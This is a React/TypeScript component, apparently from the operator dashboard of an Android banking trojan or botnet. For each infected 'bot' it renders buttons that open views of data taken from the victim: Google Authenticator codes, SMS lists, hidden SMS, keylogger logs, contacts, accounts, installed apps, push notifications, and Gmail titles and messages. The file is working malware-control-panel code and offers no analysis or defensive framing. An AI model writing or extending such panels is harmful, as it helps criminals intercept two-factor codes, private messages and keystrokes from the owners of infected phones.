import React, {useState} from "react";
import {Tooltip} from "antd";
import {Bot} from "../../../Model/Bot";
import {CommandsProps, LogButtonsProps} from "../../../Model/Commands";


import GoogleAuth from "../../Modals/GoogleAuth/GoogleAuth";
import ShowSMS from "../../Modals/ShowSMS/ShowSMS";
import Keylogger from "../../Modals/Keylogger/Keylogger";
import ContactsList from "../../Modals/ContactsList/ContactsList";
import PushList from "../../Modals/PushList/PushList";
import HideSMS from "../../Modals/HideSMS/HideSMS";
import InstalledApps from "../../Modals/InstalledApps/InstalledApps";
import GetAccounts from "../../Modals/GetAccounts/GetAccounts";
import {hasAccess} from "../../../Util/hasAccess";
import {useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import GmailMessages from "../../Modals/GmailMessages/GmailMessages";
import GmailTitles from "../../Modals/GmailTitles/GmailTitles";

interface BotDataButtonsProps {
    bot: Bot,
}

interface BotDataButtonsState extends Record<string, boolean> {
    pushList: boolean,
    googleAuth: boolean,
    smsList: boolean,
    keylogger: boolean,
    contacts: boolean,
    hiddenSMS: boolean,
    apps: boolean,
    accounts: boolean,
    gmailTitles: boolean,
    getGmailMessage: false,
}

const BotDataButtons: React.FC<BotDataButtonsProps> = (props: BotDataButtonsProps) => {
    const [commandsState, setCommandsShow] = useState<BotDataButtonsState>({
        pushList: false,
        googleAuth: false,
        smsList: false,
        keylogger: false,
        contacts: false,
        hiddenSMS: false,
        apps: false,
        accounts: false,
        gmailTitles: false,
        getGmailMessage: false,
    });

    const setShow = (key: string, value: boolean) => {
        setCommandsShow({
            ...commandsState,
            [key]: value,
        });
    };

    const authReducer = useSelector((state: AppState) => state.auth);

    const buttonsList: LogButtonsProps[] = [
        {
            name: "Push list",
            icon: <span className="icon-bot icon-button icon-push-list" />,
            action: () => setShow("pushList", true),
            hasAccess: hasAccess(authReducer.user, "pushlist.list"),
        },
        {
            name: "Show accounts",
            icon: <span className="icon-bot icon-button icon-accounts" />,
            action: () => setShow("accounts", true),
            hasAccess: hasAccess(authReducer.user, "otheraccounts.list"),
        },
        {
            name: "Show google auth codes",
            icon: <span className="icon-bot icon-button icon-google-auth" />,
            action: () => setShow("googleAuth", true),
            hasAccess: hasAccess(authReducer.user, "googleauth.list"),
        },
        {
            name: "Show SMS list",
            icon: <span className="icon-bot icon-button icon-sms-list" />,
            action: () => setShow("smsList", true),
            hasAccess: hasAccess(authReducer.user, "smslist.list"),
        },
        {
            name: "Hide SMS",
            icon: <span className="icon-bot icon-button icon-hide-sms-list" />,
            action: () => setShow("hiddenSMS", true),
            hasAccess: hasAccess(authReducer.user, "hidesms.list"),
        },
        {
            name: "Show installed apps",
            icon: <span className="icon-bot icon-button icon-installed-apps" />,
            action: () => setShow("apps", true),
            hasAccess: hasAccess(authReducer.user, "applist.list"),
        },
        {
            name: "Show contacts",
            icon: <span className="icon-bot icon-button icon-contacts" />,
            action: () => setShow("contacts", true),
            hasAccess: hasAccess(authReducer.user, "phonenumber.list"),
        },
        {
            name: "Keylogger",
            icon: <span className="icon-bot icon-button icon-keylogger" />,
            action: () => setShow("keylogger", true),
            hasAccess: hasAccess(authReducer.user, "datakeylogger.list"),
        },
        {
            name: "Show Gmail titles",
            icon: <span className="icon-bot icon-button icon-google-auth" />,
            action: () => setShow("gmailTitles", true),
            // hasAccess: hasAccess(authReducer.user, "gmailTitles.list"),
            hasAccess: true,
        },
        {
            name: "Show Gmail messages",
            icon: <span className="icon-bot icon-button icon-google-auth" />,
            action: () => setShow("getGmailMessage", true),
            // hasAccess: hasAccess(authReducer.user, "getGmailMessage.list"),
            hasAccess: true,
        },
    ];

    return (
        <>
            <div className="bot-item-permissions quickAccess">
                {buttonsList.filter((button: LogButtonsProps) => button.hasAccess).map((command: CommandsProps, id: number) => {
                    return (
                        <Tooltip
                            title={command.name}
                            placement="bottom"
                            destroyTooltipOnHide
                            zIndex={1}
                            key={id}
                        >
                            <div
                                className="bot-btn"
                                onClick={(e: any) => {
                                    command.action();

                                    e.target.classList.add("clicked");
                                }}
                            >
                                {command.icon}
                            </div>
                        </Tooltip>
                    );
                })}
            </div>

            {commandsState.pushList && (
                <PushList
                    visible={commandsState.pushList}
                    setVisible={(isVisible: boolean) => setShow("pushList", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.accounts && (
                <GetAccounts
                    bot={props.bot}
                    visible={commandsState.accounts}
                    setVisible={(isVisible: boolean) => setShow("accounts", isVisible)}
                />
            )}

            {commandsState.googleAuth && (
                <GoogleAuth
                    visible={commandsState.googleAuth}
                    setVisible={(isVisible: boolean) => setShow("googleAuth", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.smsList && (
                <ShowSMS
                    visible={commandsState.smsList}
                    setVisible={(isVisible: boolean) => setShow("smsList", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.hiddenSMS && (
                <HideSMS
                    visible={commandsState.hiddenSMS}
                    setVisible={(isVisible: boolean) => setShow("hiddenSMS", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.apps && (
                <InstalledApps
                    visible={commandsState.apps}
                    setVisible={(isVisible: boolean) => setShow("apps", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.contacts && (
                <ContactsList
                    visible={commandsState.contacts}
                    setVisible={(isVisible: boolean) => setShow("contacts", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.keylogger && (
                <Keylogger
                    visible={commandsState.keylogger}
                    setVisible={(isVisible: boolean) => setShow("keylogger", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.gmailTitles && (
                <GmailTitles
                    visible={commandsState.gmailTitles}
                    setVisible={(isVisible: boolean) => setShow("gmailTitles", isVisible)}
                    bot={props.bot}
                />
            )}

            {commandsState.getGmailMessage && (
                <GmailMessages
                    visible={commandsState.getGmailMessage}
                    setVisible={(isVisible: boolean) => setShow("getGmailMessage", isVisible)}
                    bot={props.bot}
                />
            )}
        </>
    );
};

export default BotDataButtons;
